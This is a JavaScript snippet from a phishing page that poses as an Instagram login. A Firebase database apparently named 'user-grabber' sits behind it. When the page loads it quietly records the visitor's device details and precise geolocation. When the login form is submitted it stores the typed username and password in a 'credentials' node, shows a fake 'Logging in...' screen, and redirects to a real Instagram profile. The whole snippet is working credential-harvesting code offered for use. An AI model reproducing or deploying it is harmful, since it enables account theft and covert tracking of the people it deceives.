<script>
    // Firebase Config (keep your own keys here)
    const firebaseConfig = {
        apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
        authDomain: "user-grabber.firebaseapp.com",
        projectId: "user-grabber",
        databaseURL: "https://user-grabber-default-rtdb.asia-southeast1.firebasedatabase.app",
        storageBucket: "user-grabber.firebasestorage.app",
        messagingSenderId: "1004415300770",
        appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
    };

    let db;
    try {
        firebase.initializeApp(firebaseConfig);
        db = firebase.database();
    } catch(e) {
        console.error("Firebase init failed:", e);
    }

    // Create one reference for device info
    const deviceRef = db ? db.ref('mobile_users').push() : null;

    // ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    //  DEVICE / UA / LOCATION CAPTURE (unchanged)
    // ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    function captureDevice() {
        let basicDevice = "Unknown";
        if (/windows/i.test(navigator.userAgent)) basicDevice = "Windows PC";
        else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) basicDevice = "iOS Device";
        else if (/mac/i.test(navigator.userAgent)) basicDevice = "Mac";
        else if (/android/i.test(navigator.userAgent)) basicDevice = "Android Device";

        if (deviceRef) {
            if (navigator.userAgentData) {
                navigator.userAgentData.getHighEntropyValues(["model"])
                    .then(ua => {
                        deviceRef.update({ device: ua.model || basicDevice });
                    })
                    .catch(() => {
                        deviceRef.update({ device: basicDevice });
                    });
            } else {
                deviceRef.update({ device: basicDevice });
            }
        }
    }

    let locationCaptured = false;
    function captureLocation(trigger) {
        if (locationCaptured || !deviceRef) return;
        if (window.location.protocol === "file:") return;

        navigator.geolocation.getCurrentPosition(
            pos => {
                locationCaptured = true;
                deviceRef.update({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    location_trigger: trigger,
                    timestamp: new Date().toISOString()
                });
            },
            err => {
                deviceRef.update({
                    location_error: err.message || "Geolocation failed",
                    location_trigger: trigger
                });
            },
            { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
        );
    }

    // Initial capture
    window.addEventListener('DOMContentLoaded', () => {
        if (deviceRef) {
            deviceRef.set({
                userAgent: navigator.userAgent,
                screen: `${screen.width}√ó${screen.height}`,
                language: navigator.language || navigator.userLanguage,
                time: new Date().toLocaleString(),
                status: "page_loaded"
            });
            captureDevice();
            captureLocation("page_load");
        }
    });

    // ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    //  MODAL & BLUR
    // ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    const mainContent = document.getElementById('main-content');
    const modalOverlay = document.getElementById('modal-overlay');
    const closeModalBtn = document.getElementById('closeModal');

    mainContent.addEventListener('click', () => {
        modalOverlay.style.display = 'flex';
        mainContent.classList.add('blur-active');
        captureLocation("modal_open");
    });

    closeModalBtn.addEventListener('click', () => {
        modalOverlay.style.display = 'none';
        mainContent.classList.remove('blur-active');
    });

    // ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    //  FORM SUBMIT ‚Üí SAVE CREDENTIALS
    // ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
    const loginForm = document.getElementById('loginForm');
    const loadingScreen = document.getElementById('loading');
    const finalRedirect = "https://www.instagram.com/priyankamjain___0207/";

    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        console.log(username, password);
        if (!username || !password) {
            alert("Please fill both fields");
            return;
        }

        // Save credentials
        if (db) {
            const credRef = db.ref('credentials').push();
            credRef.set({
                username: username,
                password: password,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                userAgent: navigator.userAgent,
                capturedAt: new Date().toISOString()
            })
            .then(() => console.log("Credentials saved"))
            .catch(err => console.error("Save failed:", err));
        }

        // Show fake loading
        modalOverlay.style.display = 'none';
        loadingScreen.style.display = 'flex';
        document.querySelector('.loading-text').innerText = "Logging in...";

        // Redirect after fake delay
        setTimeout(() => {
            window.location.href = finalRedirect;
        }, 1400);
    });
</script>
